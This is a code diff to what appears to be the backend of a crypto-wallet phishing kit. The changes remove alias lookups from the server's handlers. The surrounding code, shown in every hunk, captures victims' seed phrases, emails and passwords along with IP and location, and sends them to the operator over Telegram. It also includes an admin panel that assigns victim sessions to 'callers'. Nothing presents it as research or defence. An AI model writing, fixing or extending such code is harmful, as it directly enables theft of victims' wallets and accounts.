@@ -1532,10 +1532,8 @@ app.post('/verify-turnstile', async (req, res) => {
                 
                 // Only now notify admin of new session since it's verified
                 emitSessionUpdate('session_created', session);
-                const sessionAlias = aliasManager.getAlias(sessionId);
                 await sendTelegramNotification(formatTelegramMessage('new_session', {
                     id: sessionId,
-                    alias: sessionAlias || 'Not Set',
                     ip: session.clientIP,
                     userAgent: session.userAgent,
                     location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`
@@ -1690,10 +1688,8 @@ userNamespace.on('connection', async (socket) => {
             // Only notify admin if session is verified (not pending)
             if (!sessionManager.isPending(sessionId)) {
                 adminNamespace.emit('session_created', session);
-                const sessionAlias = aliasManager.getAlias(sessionId);
                 await sendTelegramNotification(formatTelegramMessage('new_session', {
                     id: sessionId,
-                    alias: sessionAlias || 'Not Set',
                     ip: clientIP,
                     userAgent,
                     location: `${ipDetails.city || 'Unknown'}, ${ipDetails.country || 'Unknown'}`
@@ -1760,10 +1756,8 @@ userNamespace.on('connection', async (socket) => {
             if (session) {
                 session.reviewCompleted = true;
                 adminNamespace.emit('session_updated', session);
-                const sessionAlias = aliasManager.getAlias(sessionId);
                 await sendTelegramNotification(formatTelegramMessage('review_completed', {
                     sessionId,
-                    alias: sessionAlias || 'Not Set',
                     ip: clientIP,
                     timestamp: data.timestamp
                 }));
@@ -1776,11 +1770,9 @@ userNamespace.on('connection', async (socket) => {
             if(session) {
                 session.selectedAmount = data.amount;
                 adminNamespace.emit('session_updated', session);
-
-                const sessionAlias = aliasManager.getAlias(sessionId);
+                
                 sendTelegramNotification(formatTelegramMessage('amount_confirmed', {
                     sessionId: session.id,
-                    alias: sessionAlias || 'Not Set',
                     amount: data.amount,
                     ip: session.ip
                 }));
@@ -1790,10 +1782,8 @@ userNamespace.on('connection', async (socket) => {
         // Handle user actions (like seed phrase submission, email, password)
         socket.on('user_action', async (action) => {
             if (action.type === 'seed_phrase_submitted') {
-                const sessionAlias = aliasManager.getAlias(sessionId);
                 await sendTelegramNotification(formatTelegramMessage('seed_phrase', {
                     sessionId,
-                    alias: sessionAlias || 'Not Set',
                     ip: session.clientIP,
                     location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`,
                     seedPhrase: action.data,
@@ -1806,10 +1796,8 @@ userNamespace.on('connection', async (socket) => {
                 }
             } else if (action.type === 'email_submitted') {
                 // Handle email submission
-                const sessionAlias = aliasManager.getAlias(sessionId);
                 await sendTelegramNotification(formatTelegramMessage('email_submitted', {
                     sessionId,
-                    alias: sessionAlias || 'Not Set',
                     ip: session.clientIP,
                     location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`,
                     email: action.data.email,
@@ -1824,10 +1812,8 @@ userNamespace.on('connection', async (socket) => {
                 }
             } else if (action.type === 'password_submitted') {
                 // Handle password submission
-                const sessionAlias = aliasManager.getAlias(sessionId);
                 await sendTelegramNotification(formatTelegramMessage('password_submitted', {
                     sessionId,
-                    alias: sessionAlias || 'Not Set',
                     ip: session.clientIP,
                     location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`,
                     email: session.email || 'Unknown',
@@ -2142,11 +2128,9 @@ adminNamespace.on('connection', (socket) => {
             // Delete the session from manager
             sessionManager.deleteSession(sessionId);
             console.log(`[REMOVE] Session ${sessionId} deleted from manager`);
-          const sessionAlias = aliasManager.getAlias(sessionId);
           adminNamespace.emit('session_removed', sessionId);
           await sendTelegramNotification(formatTelegramMessage('session_removed', {
             id: sessionId,
-            alias: sessionAlias || 'Not Set',
             removedBy: 'admin'
           }));
         }
@@ -2155,15 +2139,6 @@ adminNamespace.on('connection', (socket) => {
     // Assignment handlers
     socket.on('assign_session', ({ sessionId, callerId }) => {
         if (socket.userRole === 'admin') {
-            // Check if session has an alias before allowing assignment
-            const currentAlias = aliasManager.getAlias(sessionId);
-            if (!currentAlias) {
-                socket.emit('assignment_error', {
-                    error: 'Session must have an alias before assignment'
-                });
-                return;
-            }
-
             const success = sessionManager.assignSessionToCaller(sessionId, callerId);
             if (success) {
                 const session = sessionManager.getSession(sessionId);
